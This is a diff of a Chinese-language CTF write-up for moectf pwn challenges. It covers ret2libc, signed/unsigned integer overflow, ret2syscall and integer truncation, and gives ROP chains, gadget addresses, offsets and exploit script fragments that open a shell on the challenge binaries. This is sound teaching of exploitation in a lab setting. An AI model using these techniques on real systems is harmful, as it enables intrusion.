+ROP 链：
 
 ```
 [ret] [pop rdi; ret] ["/bin/sh"地址] [system地址]
 ```
 
 执行过程：
-1. `ret`：纯对齐用，弹一下栈。
-2. `pop rdi; ret`：把 `"/bin/sh"` 地址弹进 `rdi`，再 `ret`。
-3. `system`：此时 `rdi = "/bin/sh"`，等于 `system("/bin/sh")`，弹 shell。
+
+1. `ret`：纯对齐，弹一下栈。
+2. `pop rdi; ret`：把 `/bin/sh` 地址弹进 `rdi`。
+3. `system`：此时 `rdi = "/bin/sh"`，等于 `system("/bin/sh")`。
 
 #### 完整 exp
 
@@ -844,19 +974,21 @@ async def main():
 asyncio.run(main())
 ```
 
-跑起来之后，shell 弹出来，`cat flag` 就能拿到 flag。
+shell 弹出来，`cat flag` 就拿到 flag。
 
-#### 小结
+#### 这题学到什么
 
-这题把 ret2libc 的完整套路过了一遍：
+ret2libc 的完整流程：
 
-1. **找泄露点**：填空题填 `puts`/`printf`，用 `printf("%p", GOT地址)` 把 libc 地址打出来。
-2. **算基址**：`泄露地址 - 函数偏移 = libc 基址`。
-3. **找 gadget**：程序里没有就用 libc 里的 `pop rdi; ret`。
-4. **拼 ROP**：`ret + pop rdi; ret + "/bin/sh" + system`。
-5. **注意栈对齐**：`system` 的 `movaps` 要求对齐，补一个 `ret`。
+1. **找泄露点**：填 `puts`/`printf`，用 `printf("%p", GOT)` 把 libc 地址打出来。
+2. **算基址**：`泄露地址 - 函数偏移 = libc 基址`，结果应该是页对齐的。
+3. **找 gadget**：程序里没有就去 libc 里找 `pop rdi; ret`。
+4. **拼 ROP**：`ret + pop rdi; ret + /bin/sh + system`。
+5. **栈对齐**：`system` 的 `movaps` 要求对齐，垫一个 `ret`。
 
-跟 ret2text 比，ret2libc 多解决了一个问题：**没有现成后门，就自己从 libc 里找**；而「泄露基址」是绕 ASLR 的第一步。后面的堆利用、更复杂的 ROP，本质都是在这个思路上加花活。这题踩稳了，ASLR 和 GOT 这两个概念就算真正入门了。
+跟 ret2text 比，ret2libc 多解决一个问题：**没有现成后门，就从 libc 里找。**
+
+「泄露基址」是绕 ASLR 的第一步。后面的堆利用、更复杂的 ROP，都是在这个思路上加东西。
 
 ---
 
@@ -1628,13 +1760,15 @@ b'[hardware] Repair completed: moectf{...}\n'
 
 ### 7. 灯神的愿望：整数溢出
 
-这题是个很经典、很干净的**整数溢出（integer overflow）**入门题，题目描述自己就把解题思路剧透了一半：
+题目描述自己就把思路剧透了一半：
 
 > 灯神：你可以许 1 个愿望。
-> 小明：我想再许 3 个愿望。→ 灯神：**ERROR! 不能增加剩余愿望数！**
-> 小明：那我想再许 -2 个愿望。→ 灯神：好的，你可以许 **4294967295** 个愿望。
+> 小明：我想再许 3 个愿望。→ **ERROR! 不能增加剩余愿望数！**
+> 小明：那我想再许 -2 个愿望。→ 好的，你可以许 **4294967295** 个愿望。
 
-看到 `4294967295` 这个数，老选手秒懂——这是 `0xffffffff`，也就是 32 位无符号整数的最大值，典型的**有符号负数被当成无符号数**的下溢场景。flag 名 `N0w_You_Kn0w_Num63r_0v3rflow` 也是直接点题 "number overflow"。
+`4294967295` 就是 `0xffffffff`，32 位无符号的最大值。
+
+一个负数变成无符号最大值 —— 典型的**有符号/无符号混用**。
 
 #### 前期准备
 
@@ -1649,10 +1783,13 @@ checksec --file=pwn
 # PIE:    PIE enabled
 ```
 
-- 动态链接、有符号、`not stripped`，函数名都在，逆向轻松。
-- 有 PIE，但本题根本不需要碰地址——走的是逻辑漏洞。
+![checksec：Full RELRO、No canary、PIE](/pwn-genie-01.png)
 
-看符号和字符串，一眼看到两个关键东西：
+动态链接、有符号、没 strip。函数名都在，逆向轻松。
+
+有 PIE，但**这题不碰地址**。走的是逻辑漏洞。
+
+看符号：
 
 ```bash
 nm pwn | grep -E " T "
@@ -1666,11 +1803,23 @@ strings pwn | grep -E "bin|flag|wish"
 # ...
 ```
 
-`win` 函数 + `/bin/sh`，典型的"调用 win 拿 shell"套路。
+`win` 加 `/bin/sh`，典型的「调 win 拿 shell」。
 
-#### 逆向分析
+#### 先跑一遍
 
-##### win 函数（0x121c）
+![试三种数字：超长数字 / 2³² / 1，反应各不相同](/pwn-genie-02.png)
+
+上图试了三组输入，一眼就能看出这题的脾气：
+
+| 输入 | 显示 | 为什么 |
+|---|---|---|
+| `1199999999999999999999999999999` | `4294967295 wishes!` | 数字太长，`scanf("%d")` 读**溢出**，绕成 `-1` |
+| `4294967296`（2³²） | `0 wishes!` | 2³² 存进 32 位正好**截断成 0** |
+| `1` | `Sorry, can't increase` | 正数被拦下 |
+
+**先拿极端值试，比闷头读反汇编快。** 看到 `4294967295` 和 `0` 这两个数，基本就能确定：32 位整数，而且用无符号打印。
+
+#### `win` 是现成的后门
 
 ```asm
 win:
@@ -1678,11 +1827,9 @@ win:
     system("/bin/sh")       ; 直接弹 shell！
 ```
 
-没啥好说的，调到了就 getshell。
+调到了就 getshell。
 
-##### main 函数（0x1245）
-
-我把 main 翻译成人话，去掉打印细节：
+#### `main` 的逻辑
 
 ```c
 int main() {
@@ -1728,9 +1875,9 @@ int main() {
 }
 ```
 
-#### 漏洞：有符号检查，无符号使用
+#### 漏洞：检查用有符号，使用用无符号
 
-整题的漏洞就在 choice==1 的这段，它把**有符号**和**无符号**混着用了：
+问题在 `choice == 1` 那段：
 
 ```c
 if (n > 0) {                    // 有符号比较：负数 <= 0，能绕过
@@ -1747,7 +1894,13 @@ if (wishes <= 0x1bf51) {        // 无符号比较（反汇编里是 jbe）
 }
 ```
 
-关键反汇编（choice==3 的判断）：
+IDA 里这两句挨着看，`wishes = n` 之后马上就是 `%u` 打印：
+
+![IDA：wishes = 输入，以及用 %u 打印](/pwn-genie-05.png)
+
+`mov [rbp+var_74], eax` 是**直接赋值**，不是 `add`。填 `-1`，它就真的存 `-1`。
+
+关键反汇编（`choice == 3` 的判断）：
 
 ```asm
 13d2: cmp DWORD PTR [rbp-0x74], 0x1bf51
@@ -1755,31 +1908,38 @@ if (wishes <= 0x1bf51) {        // 无符号比较（反汇编里是 jbe）
 13db: call win                  ; 否则（无符号 > 0x1bf51）gets hell
 ```
 
-`jbe`（jump if below or equal）是**无符号**比较指令。而 `0x1bf51` = 112977。
+`jbe`（jump if below or equal）是**无符号**比较。而 `0x1bf51` = **114513**。
 
-所以逻辑是：
+所以：
 
-1. 输入 `n = -1`，`if (n > 0)` 是有符号判断，`-1 > 0` 为假，**通过**。
-2. `wishes = -1`，在内存里存的是 `0xffffffff`。
-3. 打印 `%u`，`0xffffffff` 显示成 `4294967295`（就是题目描述那个数）。
-4. 选 3 时，`cmp 0xffffffff, 0x1bf51` 做无符号比较：`4294967295 > 112977`，`jbe` 不成立，直接 `call win()` → getshell。
+1. 输入 `n = -1`。`if (n > 0)` 是有符号判断，`-1 > 0` 为假，**通过**。
+2. `wishes = -1`，内存里是 `0xffffffff`。
+3. `%u` 打印，`0xffffffff` 显示成 `4294967295`。
+4. 选 3 时，`cmp 0xffffffff, 0x1bf51` 做无符号比较。`4294967295 > 114513`，`jbe` 不成立，直接 `call win()`。
 
-一句话总结：**程序用"有符号"检查你输入的愿望数是不是正数，却用"无符号"来判断愿望够不够，负数一绕就变成了天大的数。**
+**两个陷阱叠在一起，缺一不可：**
 
-> 为什么选 -1 而不是 -2：题目描述写 -2 得 4294967295，其实那是 -1 对应的值（`0xffffffff`）。-2 是 `0xfffffffe` = 4294967294，一样能过。随便输入个负数都行，我用 -1 最直观。
+| 位置 | 指令 | 符号性 | 后果 |
+|---|---|---|---|
+| 检查你输入的愿望数 | `jle`（`n <= 0`） | **有符号** | 负数能通过 |
+| 检查愿望够不够 | `jbe`（`wishes <= 0x1bf51`） | **无符号** | `-1` 被当成 4294967295，够用 |
+
+第一个让你把负数写进去，第二个让负数变成天大的数。
+
+> 题目描述写「-2 得 4294967295」，其实那是 -1 的值（`0xffffffff`）。-2 是 `0xfffffffe` = 4294967294，一样能过。随便输个负数都行。
 
 #### 利用步骤
 
 1. 选 `1`（Make more wishes）
-2. 输入 `-1`（负数，绕过"不能增加"检查）
-3. 选 `3`（Get flag），触发 win → `/bin/sh`
-4. shell 里 `cat` 出 flag
+2. 输入 `-1`，绕过「不能增加」的检查
+3. 选 `3`（Get flag），触发 `win` → `/bin/sh`
+4. shell 里读 flag
 
-注意 flag 不在 `/flag`，而是**工作目录 `/app/flag`**（拿到 shell 后 `pwd` 是 `/app`）。所以命令是 `cat /app/flag`（`cat flag` 也行，因为就在当前目录）。
+**flag 不在 `/flag`，在工作目录 `/app/flag`。** 拿到 shell 后 `pwd` 是 `/app`。
 
 #### 完整 exp
 
-远程是 `wss://` 流量代理（端口 8080），用 `websockets` 连。分步交互更稳：
+远程是 `wss://` 流量代理（端口 8080）。分步交互更稳：
 
 ```python
 import asyncio
@@ -1814,27 +1974,31 @@ async def main():
 asyncio.run(main())
 ```
 
-跑起来关键输出：
+关键输出：
 
 ```
 You can still make 4294967295 wishes!   # -1 的无符号形态
 Your endless wishes come true!          # 进了 win
 $ cat /app/flag
-moectf{...}
 ```
 
-#### 小结与踩坑
+![本地跑通：-1 变成 4294967295，选 3 拿到 shell](/pwn-genie-03.png)
 
-知识点就一个核心，但很值得记住：
+换成一长串 `9` 也一样成立，只要 32 位结果是负数：
 
-1. **有符号 vs 无符号混用**：同一个变量，检查时当"有符号"（`n > 0`），使用时当"无符号"（`jbe` / `%u`），负数就能绕过"不能增加"的限制，摇身变成 4294967295。
-2. **反汇编看比较指令**：`jbe`/`jae` 是无符号，`jle`/`jge` 是有符号。这题判断"够不够愿望"用的是 `jbe`，直接暴露了无符号比较。
-3. **找后门**：`win` + `system("/bin/sh")` 的经典组合，`nm`/`strings` 一眼看到。
+![换成一长串 9 也能过](/pwn-genie-04.png)
 
-踩坑记录：
+#### 这题学到什么
 
-- **flag 不在 `/flag`**：拿到 shell 后习惯性 `cat /flag` 得到空输出，一度以为 shell 没弹成功。实际 flag 在**工作目录 `/app/flag`**（`pwd` 显示 `/app`，`ls -la /app` 能看到 `flag` 和 `pwn`）。所以读 flag 前先 `ls` 确认路径。
-- **-2 还是 -1**：题目描述说 -2 得 4294967295，实际那是 -1 的值，别纠结，随便输个负数都行。
+1. **有符号 vs 无符号混用**：同一个变量，检查时当有符号（`n > 0`），使用时当无符号（`jbe` / `%u`），负数一绕就变成最大值。
+2. **反汇编看比较指令**：`jbe`/`jae` 是无符号，`jle`/`jge` 是有符号。这题判断「够不够」用的是 `jbe`。
+3. **找后门**：`win` + `system("/bin/sh")`，`nm`/`strings` 一眼看到。
+
+**踩坑记录：**
+
+**flag 不在 `/flag`。** 拿到 shell 后习惯性 `cat /flag` 得到空输出，一度以为 shell 没弹成功。实际在 `/app/flag`。
+
+**-2 还是 -1 不用纠结。** 题目描述说 -2 得 4294967295，实际那是 -1 的值。随便输个负数都行。
 
 ---
 
@@ -2140,7 +2304,9 @@ asyncio.run(main())
 
 ### 9. 没有后门：ret2syscall
 
-这题名字叫 `no_backdoor`，意思很直白：**二进制里没有 `system("/bin/sh")` 之类的后门函数**。上一道"走后门"是 ret2text 直接跳后门，这道没后门了，就得自己动手用 ROP 拼出 `execve("/bin/sh")` —— 也就是经典的 **ret2syscall**。flag 名 `SYSCALL_15_4_way_When_Th3r3_1s_n0_b4CkDoOr`（"没有后门时，syscall 是一种方式"）也直接点题了。
+题名 `no_backdoor`，意思很直白：二进制里没有 `system("/bin/sh")` 这种后门函数。
+
+上一题直接跳后门，这题得自己拼出 `execve("/bin/sh")`。这就是 **ret2syscall**。
 
 #### 前期准备
 
@@ -2155,16 +2321,19 @@ checksec --file=pwn
 # PIE:    No PIE (0x400000)
 ```
 
-几个关键点：
+![checksec：静态链接、No PIE，但报了个 Canary found](/pwn-nobackdoor-01.png)
 
-- **静态链接**：所有 libc 代码都塞进了二进制。这既是好处（gadget 巨多），也是坑（`system`/`execve` 因为没被引用而被链接器裁剪掉了）。
-- **无 PIE**：代码地址固定 `0x400000`，ROP 地址写死就行。
-- **NX 开启**：栈不可执行，所以只能 ROP，不能 shellcode。
-- **Canary**：`checksec` 说找到了 canary，但等会儿你会看到 `vuln` 函数里**根本没用到**（静态链接的 glibc 含 canary 相关代码，但这个函数没启用）。
+三条信息，一条比一条关键：
 
-#### 逆向
+**静态链接**：所有 libc 代码都塞进了二进制。好处是 gadget 极多，坏处是 `system`/`execve` 因为没被引用，被链接器裁掉了。
 
-##### main / vuln
+**No PIE**：代码地址固定 `0x400000`。ROP 地址写死就行。
+
+**NX 开启**：栈不可执行。只能 ROP，不能塞 shellcode。
+
+**`Canary found` 先别当真。** 静态链接的 glibc 自带 canary 代码，`checksec` 一看到就报。得进函数里看有没有真的读 `fs:0x28`。
+
+#### 漏洞在 `gets`
 
 ```asm
 main:
@@ -2183,31 +2352,39 @@ vuln:
     ret
 ```
 
-漏洞就是 `gets(buf)`，`buf` 在 `rbp-0x40`（64 字节），`gets` 不检查长度，直接栈溢出。而且 `vuln` 里**没有 canary**，不用绕过。
+`gets(buf)`，`buf` 在 `rbp-0x40`，64 字节。`gets` 不检查长度，直接溢出。
 
-##### 有没有后门？
+`vuln` 里没有 `fs:0x28`，**canary 那条报错是假的**。
+
+#### 有没有后门？
 
 ```bash
 nm pwn | grep -iE "system|execve"
 # （只有 system_dirs 一个数据，没有 system/execve 函数）
 ```
 
-确认：`system`、`execve` 都被裁剪了。但是——
+`system`、`execve` 都被裁了。
+
+但 `/bin/sh` 还在：
 
 ```bash
 strings pwn | grep "/bin/sh"
 # 7f00e  /bin/sh
 ```
 
-**`/bin/sh` 字符串还在**！在 rodata 里，虚拟地址 `0x47f010`：
+在 `.rodata` 里，虚拟地址 `0x47f010`：
 
 ```
 47f010  2f 62 69 6e 2f 73 68 00   ->  "/bin/sh\0"
 ```
 
-题目提示里那句"好像有一串字符挺神秘的"，指的就是它。所以思路清晰：**没有后门，就用 ROP 自己构造 `execve("/bin/sh", NULL, NULL)`**，`/bin/sh` 现成有。
+![objdump 里能看到 /bin/sh 躺在 0x47f010](/pwn-nobackdoor-02.png)
 
-#### 漏洞与偏移
+题目提示里那句「好像有一串字符挺神秘的」，指的就是它。
+
+**没有后门，就用 ROP 自己拼 `execve("/bin/sh", NULL, NULL)`。字符串现成。**
+
+#### 偏移
 
 `vuln` 栈帧：
 
@@ -2219,11 +2396,11 @@ rbp       ┐  saved rbp（8 字节）
 rbp+8      ┘  返回地址（8 字节）  ← 覆盖这里
 ```
 
-`gets` 从 `rbp-0x40` 开始写，要盖到返回地址，需填满 64 字节 buf + 8 字节 saved rbp = **72 字节** padding，然后才是 ROP 链第一个地址。
+`gets` 从 `rbp-0x40` 开始写。盖到返回地址要填 64 + 8 = **72 字节**，然后才是 ROP 链。
 
 #### 构造 ret2syscall
 
-`execve` 的系统调用号是 **59**（`0x3b`）。syscall 的寄存器约定：
+`execve` 的系统调用号是 **59**（`0x3b`）。寄存器约定：
 
 ```
 rax = 59              # execve
@@ -2233,7 +2410,7 @@ rdx = 0               # envp = NULL
 syscall
 ```
 
-需要这几个 gadget：
+要找的 gadget：
 
 | 作用 | 指令 | 地址 |
 |---|---|---|
@@ -2243,31 +2420,40 @@ syscall
 | 设 rax | pop rax ; ret | 0x42146b |
 | 触发 | syscall | 0x41963f |
 
-找 gadget 用 `ROPgadget`：
-
 ```bash
 ROPgadget --binary pwn --only "pop|ret" | grep -E "pop rdi|pop rsi|pop rax"
 ROPgadget --binary pwn | grep "pop rdx"
 ROPgadget --binary pwn | grep syscall
 ```
 
-##### 两个"不干净"的 gadget 怎么处理
+#### 两个「不干净」的 gadget
 
-这是本题比较考验人的地方——静态链接里没有规规矩矩的 `pop rdx; ret` 和 `syscall; ret`，得自己挑：
+这题最费脑子的地方。静态链接里没有规规矩矩的 `pop rdx; ret`，也没有 `syscall; ret`。
 
-**1. `pop rdx` 带着一堆东西：**
+**（1）`pop rdx` 带了一串尾巴**
 
 ```
 0x46864c : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
 ```
 
-它除了 `pop rdx`，还会 `xor eax,eax` 清空 rax，再弹 4 个垃圾值。没关系：
+![ROPgadget 搜 pop rdx，只有这一个带尾巴的](/pwn-nobackdoor-04.png)
+
+它除了 `pop rdx`，还会 `xor eax,eax` 清空 rax，再弹 4 个垃圾值。
+
+处理办法：
+
 - `xor eax,eax` 把 rax 清了，但我们**最后**才用 `pop rax` 设 59，顺序上没问题。
-- 多出来的 `pop rbx/r12/r13/rbp`，在栈上补 4 个 `0` 就行。
+- 多出来的 4 个 `pop`，在栈上补 4 个 `0` 就行。
 
-**2. `syscall` 后面不是 ret：**
+**（2）`syscall` 后面不是 `ret`**
 
-静态链接里没有单独的 `syscall; ret`。`__libc_read` 里有一处：
+```
+0x41963f : syscall
+```
+
+![ROPgadget 搜 syscall，后面跟的是错误检查](/pwn-nobackdoor-05.png)
+
+`__libc_read` 里这一段：
 
 ```asm
 41963d: xor eax, eax
@@ -2277,7 +2463,9 @@ ROPgadget --binary pwn | grep syscall
 419649: ret
 ```
 
-`syscall` 后面跟的是错误检查。但我们调用 `execve`，**一旦成功进程就被 `/bin/sh` 替换，根本不会返回**，所以 `syscall` 后面的指令不会执行，直接跳到 `0x41963f` 即可。
+`syscall` 后面是错误检查。但我们调 `execve`，**一旦成功，进程就被 `/bin/sh` 替换了，根本不会返回**。
+
+所以后面那些指令不会执行，直接跳到 `0x41963f` 就行。
 
 #### 完整 exp
 
@@ -2323,39 +2511,44 @@ async def main():
 asyncio.run(main())
 ```
 
-ROP 链执行流程：
+ROP 链执行顺序：
 
-1. `pop rdx` → rdx=0（顺带清 rax，无所谓），弹掉 4 个垃圾。
+1. `pop rdx` → rdx=0，顺带清 rax，弹掉 4 个垃圾。
 2. `pop rsi` → rsi=0。
-3. `pop rdi` → rdi = 0x47f010（"/bin/sh"）。
+3. `pop rdi` → rdi = `0x47f010`。
 4. `pop rax` → rax=59。
-5. `syscall` → execve("/bin/sh", NULL, NULL)，拿 shell。
+5. `syscall` → `execve("/bin/sh", NULL, NULL)`。
 
-跑起来输出 `moectf{...}`，flag 在 `/app/flag`。
+![本地跑通，拿到 shell](/pwn-nobackdoor-06.png)
 
-#### 小结与踩坑
+#### 这题学到什么
 
-知识点梳理：
+1. **没后门就走 ret2syscall**：目标函数被裁，自己拼 `execve`。
+2. **`/bin/sh` 可能还在**：`strings` 一搜就有，省得往 bss 写字符串。
+3. **静态链接的 gadget 要会挑**：接受带前缀/后缀的 gadget。
+   - `pop rdx` 带 `xor eax,eax` 和一堆 `pop` → 「最后再设 rax + 补垃圾值」。
+   - `syscall` 带错误检查 → 利用「execve 成功不返回」。
+4. **偏移**：`buf` 64 + saved rbp 8 = 72。
 
-1. **没有后门 → ret2syscall**：目标函数被裁剪，就自己拼 `execve` 系统调用。
-2. **`/bin/sh` 字符串还在**：`strings` 一搜就有，地址 `0x47f010`，省去往 bss 段写字符串的麻烦。
-3. **静态链接的 gadget 挑选**：没有规整的 `pop rdx; ret` 和 `syscall; ret`，要学会接受"带前缀/后缀"的 gadget：
-   - `pop rdx` 后带 `xor eax,eax` 和一堆 `pop`，用"最后再设 rax + 补垃圾值"来消化。
-   - `syscall` 后带错误检查，利用"execve 成功不返回"绕过去。
-4. **偏移计算**：`buf` 64 字节 + saved rbp 8 字节 = 72。
+**踩坑记录：**
 
-踩坑记录：
+**`checksec` 的 canary 会骗人。** 它显示 `Canary found`，但 `vuln` 里压根没读 `fs:0x28`。看具体函数的反汇编比看 checksec 靠谱。
 
-- **别被 `checksec` 的 canary 骗了**：它显示 `Canary found`，但 `vuln` 里压根没读 canary。看具体函数反汇编比看 checksec 更靠谱。
-- **`syscall` 地址别取错**：`__libc_read` 里 `xor eax,eax; syscall` 是 `0x41963d` 起，`syscall` 指令本身在 `0x41963f`（`0x419641` 是后面的 `cmp`）。要跳到 `syscall` 指令，不是前面的 `xor`（否则 rax 被清成 0）。
-- **payload 里不能有 `\n`**：`gets` 遇 `\n` 截断。检查一下所有 gadget 地址的小端字节里没有 `0x0a`（本 payload 都没有，安全）。
-- **flag 在 `/app/flag`**：不是根目录 `/flag`。
+**`syscall` 地址别取错。** `__libc_read` 里 `xor eax,eax; syscall` 从 `0x41963d` 起，`syscall` 指令本身在 `0x41963f`。跳到 `xor` 就把 rax 清成 0 了。
+
+**payload 里不能有 `\n`。** `gets` 遇 `\n` 截断。检查所有 gadget 地址的小端字节里没有 `0x0a`。
+
+**flag 在 `/app/flag`**，不是根目录 `/flag`。
 
 ---
 
 ### 10. 百万英镑：整数截断
 
-这题名字借了马克·吐温的《百万英镑》小说，题目描述反复念叨"我要一张百万英镑支票、再来几张、摞上几张、另外再来一张……"最后一句"这得挨不少打，先生"是小说里的梗。它其实在暗示一个东西：**数量一直在变多，而"多"是有代价的**——对应到代码里就是**整数截断导致的检查失效**。flag 名 `C0unt1ng_By_Byt3s_1s_N0t_C0unt1ng_Saf3ly`（"按字节计数不安全"）直接点题。
+题名借了马克·吐温的《百万英镑》。题目描述反复念叨「我要一张百万英镑支票、再来几张、摞上几张……」，最后一句「这得挨不少打，先生」是小说原句。
+
+念叨这么多遍「支票」，其实在暗示一件事：**数量一直在变多，而「多」是有代价的**。
+
+对应到代码里，就是**整数截断让检查失效**。
 
 #### 前期准备
 
@@ -2370,13 +2563,13 @@ checksec --file=million-pound
 # PIE:    No PIE (0x400000)
 ```
 
-关键点：
+![checksec：Partial RELRO、No canary、NX、No PIE](/pwn-million-03.png)
 
 - **动态链接、无 PIE**（`0x400000`），地址写死。
 - **无 canary**，溢出不用绕过。
 - **NX 开启**，不能 shellcode，得 ROP/ret2text。
 
-看符号，有个很显眼的后门：
+看符号：
 
 ```bash
 nm million-pound | grep -E " T "
@@ -2388,11 +2581,25 @@ nm million-pound | grep -E " T "
 # 1394 t staff_room     <- 后门
 ```
 
-而且 `strings` 里有 `/bin/sh`。
+![nm 函数表：staff_room 这名字很可疑](/pwn-million-04.png)
 
-#### 逆向
+**`staff_room`（员工室）** —— 支票是给客户看的，员工室才是真能拿钱的地方。名字就是提示。
 
-##### staff_room（0x401394）—— 后门
+`strings` 里还有 `/bin/sh`。
+
+#### 先跑一遍
+
+![-1 和超长数字都被拒](/pwn-million-01.png)
+
+`-1` 被拒，一长串 `9` 也被拒。**说明有个检查在拦。**
+
+![输入 5 时正常：连着读 5 次](/pwn-million-02.png)
+
+输入 `5` 就正常了。它连着问 5 次 `What would you like written, sir?`。
+
+**那个数字其实是「要读几行」** —— 准确说是 `n × 8` 字节。
+
+#### `staff_room` 是后门
 
 ```c
 void staff_room() {
@@ -2401,9 +2608,19 @@ void staff_room() {
 }
 ```
 
-`execve("/bin/sh", argv, NULL)`，跳到这就 getshell。
+IDA 里看更清楚：
 
-##### cheque_bytes（0x40137f）
+![IDA F5：staff_room 的伪代码](/pwn-million-12.png)
+
+`/bin/sh` 在 `.rodata` 的 `0x402008`：
+
+![IDA：path db /bin/sh, 0](/pwn-million-07.png)
+
+`execve` 的参数顺序别记错：
+
+![execve 原型](/pwn-million-08.png)
+
+#### `cheque_bytes` 埋了祸根
 
 ```asm
 cheque_bytes:
@@ -2413,9 +2630,9 @@ cheque_bytes:
     ret                   ; 返回 eax
 ```
 
-注意 `shl eax, 3` 只动 `eax`（32 位），所以返回值是 `(n << 3)` 的**低 32 位**。这埋下了祸根。
+`shl eax, 3` 只动 `eax`（32 位），返回值是 `(n << 3)` 的**低 32 位**。
 
-##### main（0x4013c9）
+#### `main` 的检查
 
 ```c
 int main() {
@@ -2441,9 +2658,9 @@ int main() {
 }
 ```
 
-#### 漏洞：检查用"截断的字节"，读入用"完整的值"
+#### 漏洞：检查用截断后的字节，读入用完整的值
 
-这是整题的核心。关键就两行：
+关键就两行：
 
 ```c
 byte = cheque_bytes(n);   // 只取 (n<<3) 的低 8 位来检查
@@ -2451,29 +2668,72 @@ byte = cheque_bytes(n);   // 只取 (n<<3) 的低 8 位来检查
 read_exact(0, buf, n*8);  // 却用完整的 n*8 来决定读多少字节
 ```
 
-- **检查**：`byte = (n*8) & 0xff`，要求 `<= 0x60`（96）。它只看 `n*8` 的**低 8 位**。
-- **实际读入**：`read_exact(0, buf, n*8)` 用**完整的 64 位 `n*8`** 作为长度。
+- **检查**：`byte = (n*8) & 0xff`，要求 `<= 0x60`（96）。只看**低 8 位**。
+- **实际读入**：`read_exact(0, buf, n*8)` 用**完整的 64 位 `n*8`**。
 
-两者可以不一致！只要选一个 `n`，让 `n*8` 的低 8 位很小（骗过检查），但完整值很大（把 `buf` 打爆）。
+两者可以不一致。选一个 `n`，让 `n*8` 的低 8 位很小（骗过检查），但完整值很大（把 `buf` 打爆）。
 
-`buf` 从 `rbp-0x70` 开始，返回地址在 `rbp+8`，偏移 = **0x78 = 120 字节**。所以需要 `n*8 >= 128`（120 字节到返回地址，再 8 字节覆盖它）。
+汇编里看 `al`：
 
-##### 选 n
+![汇编：mov [rbp+var_9], al，只留低 8 位](/pwn-million-09.png)
+
+**怎么在 IDA 里一眼看出「只用了低 8 位」** —— 按 `F5` 看变量声明：
+
+![IDA F5：v5 是 unsigned __int8](/pwn-million-10.png)
+
+```c
+char v4[103];             // [rbp-70h]  ← 缓冲区
+unsigned __int8 v5;       // [rbp-9h]   ← ★ 8 位！
+__int64 number;           // [rbp-8h]   ← 64 位的 n
+```
+
+同一个 `n`（`__int64`），经过 `cheque_bytes` 之后存进了 `unsigned __int8`。**这就叫截断。**
+
+然后检查发生在这个 8 位变量上：
+
+![IDA F5：截断之后才检查](/pwn-million-11.png)
+
+```c
+number = read_number();
+v5 = cheque_bytes(number);     // ← 赋值给 8 位变量，自动截断
+if ( v5 <= 0x60u )             // ← 检查的是【截断后】的值
+```
+
+> **判「用了几位」看三处**：
+> ① 寄存器名（`al`/`ax`/`eax`/`rax`）
+> ② PTR 提示符（`BYTE`/`WORD`/`DWORD`/`QWORD`）
+> ③ 变量声明（`db`/`dw`/`dd`/`dq`，或 C 里的 `char`/`short`/`int`/`__int64`）
+>
+> **同一变量这几处说法不一致 → 截断漏洞。**
+
+#### 选 `n`
+
+`buf` 从 `rbp-0x70` 开始，返回地址在 `rbp+8`，偏移 = **`0x70 + 8` = 120 字节**。
 
 `n*8` 要满足：低 8 位 `<= 0x60`，且完整值 `>= 128`。
 
 - `n*8 = 128~255` 时，低 8 位是 `0x80~0xff`，都 `> 0x60`，**过不了检查**。
-- 最小可用的 `n*8 = 256`（低 8 位 `0x00`），对应 **`n = 32`**。
+- 最小可用的是 `n*8 = 256`（低 8 位 `0x00`），对应 **`n = 32`**。
 
-验证：`n = 32`，`n*8 = 256`，`byte = 256 & 0xff = 0 <= 0x60` ✓，`read_exact` 读 256 字节，足够覆盖返回地址。
+**完整的可用区间**（枚举出来的）：
 
-（这就是"百万英镑"的梗：你要的支票数量翻 8 倍后，低字节看着没超限，实际已经溢出爆栈了。）
+| n | n×8 | 低 8 位 | 过检查 | 够溢出 |
+|---|---|---|---|---|
+| 1~12 | 8~96 | 8~96 | ✅ | ❌ 读太少 |
+| 13~31 | 104~248 | 104~248 | ❌ | ✅ |
+| **32~44** | **256~352** | **0~96** | ✅ | ✅ **能用** |
+| 45~63 | 360~504 | 104~248 | ❌ | ✅ |
+| **64~76** | 512~608 | 0~96 | ✅ | ✅ 又能用 |
+
+**规律**：`n mod 32 ≤ 12`。因为 `n×8 mod 256 = 8 × (n mod 32)`。
+
+这题用 `n = 32`（读 256 字节）。`32~44` 里随便挑都行。
 
 #### 利用
 
 1. 输入 `32`（支票数量）。
-2. `read_exact` 读 256 字节：前 120 字节填 padding，第 121~128 字节覆盖返回地址为 `staff_room`（`0x401394`）。
-3. 函数返回时跳到 `staff_room` → `execve("/bin/sh")` → getshell。
+2. `read_exact` 读 256 字节：前 120 字节 padding，第 121~128 字节覆盖返回地址为 `staff_room`（`0x401394`）。
+3. 函数返回时跳到 `staff_room` → `execve("/bin/sh")`。
 
 #### 完整 exp
 
@@ -2485,7 +2745,7 @@ URL = "wss://ctf.xidian.edu.cn/api/traffic/NlkssrO0pVdZrZs0lOEL4?port=9999"
 staff_room = 0x401394
 
 n = 32                       # n*8 = 256，低字节 0，骗过检查
-payload = b'A' * 120         # buf 到返回地址的偏移 0x78
+payload = b'A' * 120         # buf 到返回地址的偏移 0x70+8
 payload += struct.pack('<Q', staff_room)   # 覆盖返回地址
 payload += b'B' * (256 - 128)              # 补齐 256 字节
 
@@ -2513,23 +2773,24 @@ async def main():
 asyncio.run(main())
 ```
 
-跑起来拿到 shell，`cat /flag` 输出 flag。
+![本地跑通：拿到 shell](/pwn-million-13.png)
 
-#### 小结与踩坑
+#### 这题学到什么
 
-知识点梳理：
+1. **整数截断**：检查用 `(n<<3)` 的低 8 位（`shl eax,3` 后取 `al`），读入用完整 64 位 `n*8`。两个长度不一致就是漏洞。
+2. **绕过检查**：选 `n=32`，让 `n*8=256` 的低字节为 0（过 `<=0x60`），但完整值够大。
+3. **ret2text 到后门**：`staff_room` 里有现成的 `execve("/bin/sh")`。
+4. **偏移**：`buf` 在 `rbp-0x70`，返回地址 `rbp+8`，`0x70+8 = 120`。
 
-1. **整数截断**：检查用 `(n<<3)` 的**低 8 位**（`shl eax,3` 后取 `al`），实际读入用**完整 64 位 `n*8`**。两个长度不一致，就是漏洞。
-2. **绕过检查**：选 `n=32`，让 `n*8=256` 的低字节为 0（通过 `<=0x60`），但完整值足够大溢出。
-3. **ret2text 到后门**：`staff_room` 里现成的 `execve("/bin/sh")`，覆盖返回地址即可。
-4. **偏移计算**：`buf` 起点 `rbp-0x70` 到返回地址 `rbp+8`，偏移 `0x78 = 120`。
+**踩坑记录：**
 
-踩坑记录：
